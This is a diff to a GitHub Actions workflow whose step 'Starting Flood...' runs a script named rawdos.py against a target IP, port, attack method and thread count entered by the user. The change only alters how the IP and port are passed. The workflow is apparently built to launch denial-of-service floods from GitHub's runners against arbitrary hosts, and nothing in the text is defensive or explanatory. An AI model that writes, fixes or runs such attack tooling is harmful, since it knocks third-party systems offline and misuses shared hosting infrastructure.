@@ -35,4 +35,4 @@ jobs:
         if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
     - name: Starting Flood...
       run: |
-        python rawdos.py ${{ github.event.inputs.iptgt }}:${{ github.event.inputs.portgt }} ${{ github.event.inputs.method }} ${{ github.event.inputs.thread }}
+        python rawdos.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.portgt }} ${{ github.event.inputs.method }} ${{ github.event.inputs.thread }}
